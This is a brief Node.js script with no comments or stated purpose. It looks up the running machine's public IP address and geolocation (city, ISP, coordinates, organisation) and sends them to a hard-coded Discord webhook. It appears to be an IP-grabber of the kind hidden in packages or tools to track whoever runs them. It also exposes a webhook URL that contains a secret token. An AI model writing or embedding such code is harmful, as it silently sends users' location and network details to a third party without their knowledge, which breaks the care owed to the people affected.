const axios = require('axios');
const { Webhook, MessageBuilder } = require('discord-webhook-node');
const webhook = new Webhook("https://discord.com/api/webhooks/1361675207051317419/LqdYKxYX5CjAU3ij1bgfa2NfQQL95Zi_x-W3_P-CRrtExk9Du-HNafKm1KC2pN-mpX1z");

const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
axios.get('https://api.ipify.org/')
    .then(response => {
        const ip = response.data;
        return axios.get(`http://extreme-ip-lookup.com/json/${ip}`);
    })
    .then(response => {
        const geo = response.data;
        const embed = new MessageBuilder()
            .setTitle('IP Information')
            .setColor('#00b0f4');

        const fields = [
            { name: 'IP', value: geo.query },
            { name: 'ipType', value: geo.ipType },
            { name: 'Country', value: geo.country },
            { name: 'City', value: geo.city },
            { name: 'Continent', value: geo.continent },
            { name: 'IPName', value: geo.ipName },
            { name: 'ISP', value: geo.isp },
            { name: 'Latitude', value: geo.lat },
            { name: 'Longitude', value: geo.lon },
            { name: 'Org', value: geo.org },
            { name: 'Region', value: geo.region },
            { name: 'Status', value: geo.status },
        ];

        fields.forEach(field => {
            if (field.value) {
                embed.addField(field.name, field.value, true);
            }
        });

        webhook.send(embed);
    })
    .catch(error => {
        console.error(error);
    });
